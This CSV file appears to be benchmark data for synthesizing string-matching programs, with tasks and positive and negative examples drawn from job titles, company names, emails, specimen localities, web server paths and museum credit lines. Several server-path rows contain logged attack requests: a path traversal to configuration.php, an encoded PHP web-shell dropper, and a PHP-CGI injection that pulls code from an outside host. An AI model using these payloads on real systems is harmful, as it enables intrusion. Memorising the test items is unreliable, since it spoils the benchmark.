bid,database,table,column,task,train-positive,train-negative,test-positive,test-negative,GPT-3.5-exec-precision,GPT-3.5-exec-recall,GPT-3-exec-precision,GPT-3-exec-recall,FlashGPT-precision,FlashGPT-recall,FlashGPT-program,FlashGPT-time,FlashGPT-#ex,GPT-3.5-regex-precision,GPT-3.5-regex-recall,GPT-3.5-regex-program,GPT-3.5-regex-time,GPT-3.5-regex-#sample,GPT-3.5-synth-precision,GPT-3.5-synth-recall,GPT-3.5-synth-time,GPT-3.5-synth-program,GPT-3.5-synth-#sample,GPT-3-synth-precision,GPT-3-synth-recall,GPT-3-synth-time,GPT-3-synth-program,Smore-precision,Smore-recall,Smore-program,Smore-time,Smore-no-type-precision,Smore-no-type-recall,Smore-no-type-program,Smore-no-type-time,Smore-no-type-system-precision,Smore-no-type-system-recall,Smore-no-type-system-program,Smore-no-type-system-time,Smore-no-decomp-precision,Smore-no-decomp-recall,Smore-no-decomp-program,Smore-no-decomp-time,Smore-no-repair-precision,Smore-no-repair-recall,Smore-no-repair-program,Smore-no-repair-time,Smore-no-repair-#sample,Smore-no-sketch-precision,Smore-no-sketch-recall,Smore-no-sketch-program,Smore-no-sketch-time
21,marketing,MARKETING_CAMPAIGN_ACTIVITY,Title,Software engineer with salary > 100k,"*RUBY ON RAILS Developer w/ CLOUD exp. to 140K
Dynamics AX / DAX / AXAPTA Developer $120k
*SR. Software Enginner w/ AWS/Cloud exp. 100% REMOTE to 200K or 125hr","$95k (DOE)
C#.Net Developer 55K to 80K (Perm Hire)
Data Scientist $250","MS Business Intelligence Developer 115k
Lead Backend Software Engineer $200k
Senior Java Engineer $135k
Front End UI Architect / Engineer $195k
Senior Android Developer $140k
MS BI Analyst/Developer | Dunwoody, Georgia | 105K
Javascript Developer for a Cutting Edge Company to $110K
Lead Software Applications Developer $100K
SIS Developer/Architect $130k
Lead DevOps Engineer $150k","Magento Software Developer: 110
Linux Engineer (Build, Deploy, Release, AWS)
BlackLine Cloud Platform Consultant
Senior Python/C++ Game Engineer (Relocation)
Android Developer ( Remote Work)
SENIOR .NET DEVELOPER
Microsoft .Net and Azure Developer
Sr. Java Developer (2 positions)
Java Automation API Test Engineer in Palo Alto, CA
Web Developer (NetSuite)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
22,marketing,MARKETING_CAMPAIGN_ACTIVITY,Title,Software engineer that have specified working locations,".NET Developer reqd at Edina MN
Axiom Developer Needed in Boston, MA
Sr. Java Programmers in Richmond, VA","SAP MDG Consultant in Dublin, OH
Senior Windows Administrator/Easton, PA  5 mth+ contract (VR)
 Sr. Systems Administrator Needed ASAP in Vinings Area!!!",".NET Developer (Web API/ SQL/ JavaScript) in Winter Park, FL
Sr. Java Programmers in Richmond, VA
Lead Python Developer in Newton MA
MS BI Analyst/Developer at Dunwoody, Georgia
Sr. Oracle Application Developer in Dublin, OH
HP Exstream Lead Developer in Bloomington, IL
SharePoint Developer in Pittsburgh, PA
PHP Developer in IRVING
Senior Android Developer in Newport Beach, CA
Sr. Software Engineer in ATL","Full Stack Developer | Unlimited Paid Vacation
Senior Scientific Software Developer
Sitecore Lead Onsite role
SFDC or JAVA Software Engineer/Developer
Senior Technology Support Analyst
Java Spring Integration Developer
python / node.js developer
Need: DataStage Information Analyzer Consultant_ West Norriton, PA
Sr. Application Performance Engineer (1099 or W2 only)
Network Engineer (Junior) (Contract to Hire)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
23,marketing,MARKETING_CAMPAIGN_ACTIVITY,Account,Find business name with at least 3 words,"Kinross Gold Corporation
Harley-Davidson Motor Company
Fisheries And Oceans Canada","Hampton
Kongsberg Maritime
Columbia Sportswear","Whole Foods Market
Sunshine Insurance Group
Spectrum Brands, Inc
The Corcoran Group
Hyundai Motor India Ltd
India Infoline Ltd
White House Black Market
Four Seasons Hotels And Resorts
Gold Coin Capital Market Pvt.Ltd
Motilal Oswal Financial Services Ltd","Ooredoo Qatar
Iron Mountain
Bpifrance
Ineco
Hess Corporation
City Of San Diego
State Of Hawaii
Ut Southwestern Medical Center At Dallas
American Airlines
City Of Los Angeles",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
24,marketing,MARKETING_CAMPAIGN_ACTIVITY,Account,find format of the style xx of [place],"Insurance Corporation Of British Columbia
Agricultural Bank Of China
Government Of Maharashtra","Indian Institute Of Science
Hospital & Healthcare Brazil
Virgin Australia","Royal Bank Of Scotland
Visiting Nurse Service Of New York
Industrial And Commercial Bank Of China
Mutual Of Omaha
Blue Cross Blue Shield Of Michigan
National Bank Of Egypt
National Bank Of Canada
Federal Reserve Bank Of New York
Corrections Corporation Of America
National Bank Of Pakistan
First National Bank Of Omaha","Sun International
Autonomo
Perkinelmer, Inc.
Rockwell Collins
Mercedes-Benz Usa
The Whiting-Turner Contracting Company
Bausch + Lomb
Eureka Forbes Ltd
University Of Gothenburg",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
25,salesforce,USER,Email,find those emails that contains number in its username,"jwilletts3@telegraph.co.uk
ahawkes6w@pinterest.com
gjellis10@angelfire.com","ratlayb@si.edu
fborei@domainmarket.com
rwhalebellyk@so-net.ne.jp","bceaplen5u@rakuten.co.jp
rcragg6v@wikispaces.com
tmicallef7l@reddit.com
arassmann7f@state.tx.us
ahawkes6w@pinterest.com
adeverell5j@sitemeter.com
cconiff7v@state.gov
naron9z@sun.com
eroostan8z@cam.ac.uk
hkirsche1@etsy.com","egynnifx@amazon.co.jp
ldetheridgefy@google.co.jp
cpettwoodgh@symantec.com
nmeinscp@list-manage.com
aspurwaycx@pinterest.com
kfranzelam@devhub.com
dtolchardebn@w3.org
tgradondg@smh.com.au
mtookdl@mit.edu
agerberbq@wisc.edu",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
26,salesforce,USER,Email,find those emails that ends with number in its username and ends with a country domain,"jwilletts3@telegraph.co.uk
edavenell34@google.nl
mbresnen5@spiegel.de","twhatley27@who.int
clynd28@1688.com
ffilchakov1x@biglobe.ne.jp","jabramowitch68@exblog.jp
mhowcroftc6@abc.net.au
cchaster81@ucoz.ru
ogove40@mail.ru
mgeorgeonc9@narod.ru
dferroli41@google.com.br
gkolushevb1@360.cn
jedsellb2@ebay.co.uk
largoa3@yahoo.co.jp
lpoulsona4@sakura.ne.jp","aewbankaj@slideshare.net
rhannaway3b@uiuc.edu
tmccrudden55@linkedin.com
afeare2i@flavors.me
fmichieldw@upenn.edu
fmartellinicu@jugem.jp
jkubalad8@nytimes.com
mgazzard54@dell.com
crickardsson7z@360.cn
msingsg0@scribd.com",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
27,snowflake_account_usage,QUERY_HISTORY,Release Version,find those version with minor between 10-40 and more than one patches,"5.20.1
5.40.1
6.10.2","5.41.1
6.9.2
5.22.0","5.37.3
6.12.1
5.22.1
6.12.1
5.14.3
5.26.1
6.13.1
5.39.1
5.40.2
5.29.1","5.38.0
5.23.0
5.27.0
5.45.0
5.20.0
5.28.0
5.46.1
5.24.0
5.45.1
5.44.2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
28,stocks,INDUSTRIES,Company Name,find those company with 3-letter abbreviation,"The TJX Companies, Inc. (TJX)
American Express Company (AXP)
Associated Banc-Corp (ASB)","Plumas Bancorp (PLBC)
The Children's Place, Inc. (PLCE)
Pinnacle Foods Inc. (PF)","Booz Allen Hamilton Holding Corporation (BAH)
Tenneco Inc. (TEN)
Winnebago Industries, Inc. (WGO)
Joy Global Inc. (JOY)
American Financial Group, Inc. (AFG)
Mueller Industries, Inc. (MLI)
Simpson Manufacturing Co., Inc. (SSD)
Gray Television, Inc. (GTN)
Hertz Global Holdings, Inc. (HTZ)
Jabil Circuit, Inc. (JBL)","The Liberty SiriusXM Group (LSXM.K)
Walter Energy, Inc. (WLTG.Q)
Northwest Indiana Bancorp (NWIN)
QUALCOMM Incorporated (QCOM)
CommScope Holding Company, Inc. (COMM)
1st Constitution Bancorp (FCCY)
Nutri Pharmaceuticals Research, Inc. (NRPR)
T-Mobile US, Inc. (TMUS)
WSFS Financial Corp. (WSFS)
Puration, Inc. (PURA)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
29,stocks,INDUSTRIES,Company Name,find those company with abbreviatrion contianing a dot,"Marine Petroleum Trust (MARP.S)
LCTI Low Carbon Technologies International Inc. (LWCT.F)
Alabama Aircraft Industries, Inc (AAII.Q)","Sionix Corp. (SINX)
First Commonwealth Financial Corporation (FCF)
Altria Group, Inc. (MO)","Motors Liquidation Company GUC Trust (MTLQ.U)
First Real Estate Investment Trust of New Jersey (FREV.S)
Pacific WebWorks, Inc. (PWEB.Q)
The Liberty SiriusXM Group (LSXM.K)
CohBar, Inc. (COB.U)
4Licensing Corporation (FOUR.Q)
Crumbs Bake Shop, Inc. (CRMB.Q)
Gryphon Gold Corporation (GYPH.Q)
Republic Airways Holdings Inc. (RJET.Q)
Hampshire Group, Limited (HAMP.Q)","Sophiris Bio, Inc. (SPHS)
Stock Yards Bancorp, Inc. (SYBT)
CES Synergies, Inc. (CESX)
Mustang Alliances, Inc. (MSTG)
Clovis Oncology, Inc. (CLVS)
GlycoMimetics, Inc. (GLYC)
Guess?, Inc. (GES)
LightPath Technologies, Inc. (LPTH)
Health Discovery Corporation (HDVY)
Cogint, Inc. (COGT)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30,,portal_rodents_19772002,locality,find strings of the format {state}; {county}; {detail},"FL; Franklin Co.; Dog Island; bordering large inland marsh between old dump area and the powerstation.
FL; Franklin Co.; just N of Avenue B in town of Apalachicola.
Florida; Gulf County; E side of","FL; Bay Co.
Denkanikota
New Orleans, La.","FL; Dixie Co.; Shired Island
FL; Franklin Co.; St.Vincent Island
FL; Bay Co.; bordering Moccasin Creek at Blue Springs Road bridge, N of Bennett (1.8 mi S of Rte 20)
FL; Citrus Co.; off US 27 just south of Crystal River
FL; Bay Co.; outside fence row bordering roadside dep.
Florida; Leon County; in heavily wooded area, ca 1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee.
Florida; Leon County; on wooded natural levee by the Apalachicola River, between Jim Woodruff Dam and U.S. Rt. 90 bridge, E of Sneads.
FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.
FL; Palm Beach Co.; swamp in the Daggerwing Nature Center of South County Regional Park west of Boca Raton
FL; Leon Co.; Elinor Klapp-Phipps Park (W of Meridian Rd, N of Tallahassee)
FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.","(Camporee Field) at Wallwood Boy Scout Reservation on Ocklawaha Arm of Lake Talquin, ca. 10 air mi S of Quincy.
road to St. Mark's lighthouse; St. Mark's Wildlife Refuge.
Trib of Meadow Creek, FS Rd 443 2.6 mi S of FS Rd 223, Nez Perce National Forest
shore of Lake Jackson; North of Tallahassee.
Green Rd.; SW 1/4 of NW 1/4 Sec 6, T2N R4E
3.5 miles north of Allicance Cross Road on Fla. Rt. 71.
Florida; ; Floating in Withlachoochee River at Istachatta, Florida.
FL, Jefferson County, Wacissa Spring
3.5 miles north of Allicance Cross Road on Fla. Rt. 71.
St. Vincent Island, wet swale",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
31,,portal_rodents_19772002,locality,find strings containing {int} miles {Direction} of {Road},"Upper Hoh Rd 8.3 mi E of US 101
FS Rd 443 0.8 mi S of Selway River Rd, Nez Perce National Forest
FL; Hernando Co.; US 41 2 miles N of Brooksville","FL; Bay Co.; outside fence row bordering roadside dep.
near Lake Lindsey
FL; Dixie Co.; Shired Island","FL; Bay Co.; bordering Moccasin Creek at Blue Springs Road bridge, N of Bennett (1.8 mi S of Rte 20)
FL; Franklin County; 1 mi E of Highway 319 at terminus of C-370
Slate Creek Rd 10.2 mi E of US 95, Nez Perce National Forest
FL; Alachua County; 0.2 miles east of Hwy 121 (SW 34th Street)
FS Rd 25 4.6 mi S of FS Rd 300, Gifford Pinchot National Forest
Swampy woodland 2 miles E of Tallahassee
FS Rd 443 2.6 mi S of FS Rd 223, Nez Perce National Forest
Fla. Rt. 71 3.5 miles north of Allicance Cross Road
FL; Pasco County; 2 Miles east of US 75
Burgdorf Rd 12.4 mi NW of Warren Wagon Rd","Florida; Leon County; near human habitation but in old hardwood forest with much beech and magnolia in ravine; on Ireland property near the Indian Mounds near Lake Jackson.
FL; Dixie Co.; Shired Island
FL; Lee Co.; hammock forest; west of Bonita Beach.
Eagle Mountain Trailhead, Clearwater National Forest
FL; Franklin Co.; just N of Avenue B in town of Apalachicola.
FL; Leon Co.; Elinor Klapp-Phipps Park (W of Meridian Rd, N of Tallahassee)
Florida; Leon County; in heavily wooded area, ca 1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee.
FL; Franklin Co.; Apalachicola National Estuarine Sanctuary; near the Marshall House on bayside of island.
FL; Palm Beach Co.; Sand pine scrub just W of DuBois Park on south side of Jupiter Inlet. Naturalized.
FL; Bay Co.; pasture; just E of Rte 77 on N side of Southport; T2S, R14W, NE1/4 SE1/4 Sec 21",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
32,,portal_rodents_19772002,locality,find strings that are either in forest or in park,"Gifford Pinchot National Forest
1/2 mile N of entrance to Maclay Gardens State Park, Tallahassee
Split Creek Trail, Nez Perce National Forest","Upper Hoh Rd 8.3 mi E of US 101
at Waikamoi trail, Maui, Hawaii
off US 27 just south of Crystal River","Florida; Lee County; Caloosahatchee Regional Park
FL; Leon Co.; Elinor Klapp-Phipps Park
Nez Perce National Forest
Trib of Meadow Creek, Nez Perce National Forest
Swamp in the Daggerwing Nature Center of South County Regional Park
Slate Creek Rd 10.2 mi E of US 95, Nez Perce National Forest
near Red River Hotsprings, Nez Perce National Forest
Florida; Alachua County; Mixed hardwood forest
Canyon Creek Trailhead, Clearwater National Forest
FL, Jefferson County, Wacissa Spring","Florida; Brevard County; Erna Nixon Hammock; property owned by Melbourne Village.
Burgdorf Rd 12.4 mi NW of Warren Wagon Rd
near Lake Lindsey.
FL; Wakulla Co.; woods; sect 7, T4S, R3W, Tallahassee meridian; 30 mi. sw Tallahassee.
FL; Hernando Co.; Along US 41, 2 miles n. of Brooksville; low, grazed meadow at Croom Road; fence row along US 41.
Florida; Jefferson County; by E edge of West Lake Rd.; near NE shore of Lake Miccosukee; 1.6 mi. S of jctn. with paved Green Rd.; SW 1/4 of NW 1/4 Sec 6, T2N R4E
road to St. Mark's lighthouse; St. Mark's Wildlife Refuge.
Florida; Leon County; on wooded natural levee by the Apalachicola River, between Jim Woodruff Dam and U.S. Rt. 90 bridge, E of Sneads.
FL; Highlands Co.; near parking area and nature trail at Archbold Biological Research Station, ca. 6 air mi S of Lake Placid. T38S, R30E, SE1/4 of SE1/4 Sec 7.
Florida; Pasco County; Just west of Blanton on FLA 41, ca. 2 miles east of US 75",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33,,portal_rodents_19772002,locality,find strings that are either in lake or river,"near Lake Lindsey
on the shore of Lake Jackson
trib of Meadow Creek","Gifford Pinchot National Forest
N of Avenue B in town of Apalachicola
Caloosahatchee Regional Park","South of Crystal River
near Wacissa Spring
on wooded natural levee by the Apalachicola River
bordering Moccasin Creek at Blue Springs Road bridge
Big Slough Branch of Whiskey George Creek
Withlachoochee River at Istachatta, Florida
floodplain of Cow Creek Landing
Ireland property near Lake Jackson
Ocklawaha Arm of Lake Talquin","Just west of Blanton on FLA 41
in lowland woods and around clearings of bay forests
Mixed hardwood forest next to Williston Rd
Dunes, Anna Maria Key
Swampy woodland
Erna Nixon Hammock
in heavily wooded area
Copalinga Private Reserve-red trail (1420m)
Elinor Klapp-Phipps Park",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
34,,portal_rodents_19772002,locality,find strings that are ~<10mi from a road,"1.6 mi. S of Green Rd
Upper Hoh Rd 10.2 mi E of US 101
FS Rd 25 4.6 mi S of FS Rd 300","20 mi N of Kojonup
Between highway 98 and the river opposite 3rd Street W in Carrabelle
near Red River Hotsprings, Nez Perce National Forest","0.2 mi. east of Hwy 121
1.8 mi S of Rte 20
FS Rd 443 0.8 mi S of Selway River Rd
1 mi SW of intersection with Old Coast Road
FS Rd 443 2.6 mi S of FS Rd 223
3.5 mi north of Allicance Cross Road
4.5 mi S of town of Sopchoppy
Slate Creek Rd 8.3 mi E of US 95","30 mi. SW Tallahassee
US 27 just south of Crystal River
East of taxiways at McCoy Field, Orlando
Florida; Dade County; in Miami Beach
swamp in the Daggerwing Nature Center of South County Regional Park west of Boca Raton
weedy vacant waterfront lot, Key West.
Floating in Withlachoochee River at Istachatta, Florida.
6 mi S of Lake Placid
1/2 mi. N of entrance to Maclay Gardens State Park
US 41 2 mi N of Brooksville",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
35,,server,path,find those apache log with id more than 151000,"/apache-log/access_151005.log
/apache-log/access_151225.log
/apache-log/access_151111.log","/apache-log/access_150122.log
/apache-log/access.log.41.gz
/apache-log/error.log.34.gz","/apache-log/access_160103.log
/apache-log/access_151224.log
/apache-log/access_151022.log
/apache-log/access_151118.log
/apache-log/access_151126.log
/apache-log/access_151109.log
/apache-log/access_151120.log
/apache-log/access_151104.log
/apache-log/access_151024.log
/apache-log/access_151207.log","/apache-log/access_150528.log
/apache-log/access_150930.log
/apache-log/access_150905.log
/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php
/apache-log/access_150624.log
/apache-log/access_150917.log
/apache-log/access_150901.log
/apache-log/access_150711.log
/apache-log/access_150619.log
/apache-log/access_150523.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
36,,server,path,find those apache log with id more than 151000 or log with gz that is less than 50,"/apache-log/access_151005.log
/apache-log/access.log.50.gz
/apache-log/access_151226.log","/apache-log/access_150905.log
/apache-log/index.php?option=com_search
/apache-log/error.log.51.gz","/apache-log/access_151120.log
/apache-log/access_151028.log
/apache-log/access_151214.log
/apache-log/access_151024.log
/apache-log/access.log.17.gz
/apache-log/access_151101.log
/apache-log/error.log.6.gz
/apache-log/access.log.39.gz
/apache-log/access_160104.log
/apache-log/access_151212.log","/apache-log/access_150113.log
/apache-log/error.log.88.gz
/apache-log/error.log.67.gz
/apache-log/access.log.80.gz
/apache-log/access_150120.log
/apache-log/access.log
/apache-log/error.log.84.gz
/apache-log/access.log.47.gz
/apache-log/error.log.70.gz
/apache-log/error.log.55.gz",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
37,,server,path,find thsoe strings that are aty least 3 directory deep,"/images/phocagallery/thumbs/phoca_thumb_m_winterfoto%2017.jpg
/images/stories/explore.php?baca
/administrator/templates/khepri/images/j_crn_tr_light.png","/apache-log/access_150323.log
/_DB_.sql.zip
/components_com_content/metadata.xml","/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_zimmer.jpg
/modules/mod_bowslideshow/tmpl/images/image_shadow.png
/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php
/media/editors/tinymce/skins/lightgray/img/thumb.php
/components/com_phocagallery/assets/js/shadowbox/src/lang/shadowbox-en.js
/administrator/templates/khepri/favicon.ico
/modules/mod_bowslideshow/tmpl/images/right.png
/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php
/images/stories/raith/garage.jpg","/www.almhuette-raith.at.sql
/imagesstories/magic.php.png?baca
/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/images/al277.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
/index.php?option=com_phocagallery&view=category&id=3:almhuette-raith&Itemid=53
/index.php?Itemid=55&id=49&option=com_content&view=article
/images/image.php
//index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20
 /www.almhuette-raith.at.sql
/index.php?option=com_phocagallery&view=category&id=1&Itemid=53&limitstart=20
/modules/mod_mapsgoogle/mod_mapsgoogle.php",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
38,,server,path,php files,"/CHANGELOG.php
/images/maink.php
/apache-log/images/stories/petx.php","/access
/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://demo.exent.it/egoitaliano///media/r.txt
/images/stories/raith/oststeiermark.png","/index.php?option=com_content&view=article&id=46&Itemid=54
/apache-log/images/stories/magic.php
/images/404.php
/configuration.php
/libraries/image-import.php
//cfg-contactform-6/inc/upload.php
/administrator/index.php
/images/cachefix.php
/tmp/kurd.php
/configuration.php-dist","/components/com_phocagallery/assets/phocagallery.css
/apache-log/access_151019.log
/apache-log/?M=A
/images/stories/raith/wohnung_1_web.jpg
/images/stories/raith/almhuette_raith.jpg
/apache-log/error.log.8.gz
/images/stories/raith/wohnung_2_web.jpg
/index.php?option=com_phocagallery&view=category&id=3:almhuette-raith&Itemid=0
/images/stories/slideshow/almhuette_raith_01.jpg
/apache-log//images/stories/create.gif",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
39,,server,path,photos with number in its name,"/images/phocagallery/thumbs/phoca_thumb_l_winterfoto%204.jpg
/photos/apple-touch-icon-114x114-precomposed.png
/images/stories/raith/wohnung_2_web.jpg","/apache-log/access_150217.log
/index.php?option=com_phocagallery&view=category&id=1&itemid=53
/images/phocagallery/almhuette/thumbs/phoca_thumb_m_grillplatz.jpg","/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_009.jpg
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_004.jpg
/images/phocagallery/thumbs/phoca_thumb_l_winterfoto%2023.jpg
/images/phocagallery/almhuette/thumbs/phoca_thumb_m_almhuette_raith_006.jpg
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_006.jpg
/images/phocagallery/almhuette/thumbs/phoca_thumb_m_almhuette_raith_014.jpg
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_almhuette_raith_001.jpg
/images/phocagallery/Ferienwohnung_2/thumbs/phoca_thumb_l_3_wohnkche1.jpg
/images/phocagallery/Ferienwohnung_2/thumbs/phoca_thumb_m_4_schlafzimmer.jpg
/administrator/templates/khepri/images/j_button1_left.png","/modules/mod_bowslideshow/tmpl/images/right.png
/images/phocagallery/almhuette/thumbs/phoca_thumb_m_jaegerzaun_gr.jpg
/templates/jp_hotel/images/bullet.gif
/administrator/templates/khepri/images/notice-alert.png
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_garage.jpg
/index.php?option=com_phocagallery&view=category&id=2:winterfotos&Itemid=0
/administrator/templates/khepri/images/h_green/j_header_right.png
/images/phocagallery/almhuette/thumbs/phoca_thumb_l_zimmer.jpg
/components/com_phocagallery/assets/js/shadowbox/src/skin/classic/icons/next.png
/components/com_phocagallery/assets/images/shadow1.gif",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
40,,met,Credit Line,Gift from two people after 2000,"Gift of Thomas and Mona Tourlentes, 2000
Gift of Sylvan Barnet and William Burto, in honor of Saretta and Howard Barnet, 2014
Gift of Tobias Meyer and Mark Fletcher, 2020","Gift of Joan Washburn, 2017
Gift of Victoria and Iain Nasatir, 1984
Purchase, Whittelsey Fund, 1960","Gift of The Jerry and Emily Spiegel Family Foundation, 2007
Gift of Eileen and Michael Cohen, 2008
Gift of Susan and Fredrick Orkin, 2014
Gift of Janis Conner & Joel Rosenkranz, NY, 2018
Gift of Alfred and Lisl Greenberg, 2016
Gift of Patricia Pastor and Barry Friedman, 2012
Gift of Edward Pearce Casey and Carolyn H. Specht, 2016
Gift of Thomas and Gianna Le Claire, 2010
Gift of Craig and Elizabeth Zamiello, 2019
Gift of Harold Koda and Alan Kornberg, 2001","Gift of E. Mortimer Newlin, 1964
Brooklyn Museum Costume Collection at The Metropolitan Museum of Art, Gift of the Brooklyn Museum, 2009; Gift of Charles James, 1951
Purchase, Mobil Foundation Inc. Gift; Sheikh Nasser Sabah al-Ahmed al-Sabah Gift, in memory of Richard Ettinghausen, 1980
Gift of the Estate of Marcia Brady Tucker, 1990
Purchase, The Abraham Foundation Inc., David L Klein Jr. Memorial Foundation Inc. and Gawain McKinley Gifts, 1985
Purchase, 2017 Benefit Fund; Lila Acheson Wallace Gift; Mary Trumbull Adams and Victor Wilbour Memorial Funds; Friends of European Paintings and Henry and Lucy Moses Fund Inc. Gifts; Gift of Julia A. Berwind, by exchange; Charles and Jessie Price, Otto Naumann, Mr. and Mrs. Richard L. Chilton Jr., and Sally and Howard Lepow Gifts; Charles B. Curtis Fund; and Theodocia and Joseph Arkus Gift, 2017
The Rubel Collection, Purchase, Lila Acheson Wallace, Anonymous, Joyce and Robert Menschel, Jennifer and Joseph Duke, and Ann Tenenbaum and Thomas H. Lee Gifts, 1997
Gift of Famille de Bayser in honor of George Goldner, 2021
Purchase, Rogers Fund and Gift of Mrs. Benjamin Knower, Bequest of Ogden Mills, and Bequest of Collis P. Huntington, by exchange, 1949
Purchase, Anne Murray Gift, in memory of Rita C. Murray, 1994",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
41,,met,Credit Line,Gift from some institution before 2000,"Gift of University of Virginia Drama Department, 1977
Gift of The Art Institute of Chicago, 1990
Friends of The Costume Institute Gifts, 1980","Gift of Mrs. Otto H. Bacher, 1938
Friends of The Costume Institute Gifts, 2016
Gift of Kohler Foundation, Inc. in collaboration with the Kansas City Art Institute, 2017","Gift of Tiffany & Co., 1985
Gift of Steuben Glass Inc., 1949
Gift of Cooper Union Museum for the Arts of Decoration, 1949
Gift of School Art League of New York City, 1924
Gift of The Museum of the City of New York, 1944
Gift of The British School of Archaeology in Egypt, 1913
Gift of The French Institute Library, 1950
Gift of The Institute of Archaeology, The University of London, 1951
Gift of Teachers College, Columbia University, 1959
Gift of The Fashion Group Inc., 1975","Purchase, Lila Acheson Wallace Gift, 1986
Gift of Mr. and Mrs. Warren Brandt, 1984
Gift of the George Eastman House, 1959
Gift of Bettina Ballard, 1958
Gift of Lewis Einstein, 1964
The Elisha Whittelsey Collection, The Elisha Whittelsey Fund, 1929
Gift of Eric N. Shrubsole, 1969
Gift of Denis Gallion and Daniel Morris, 1991
Gift of Mrs. William Rhinelander Stewart, 1976
Gift of Miss Adelaide Milton de Groot, in memory of her sister, the Countess Caravadossa d'Aspremonte",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
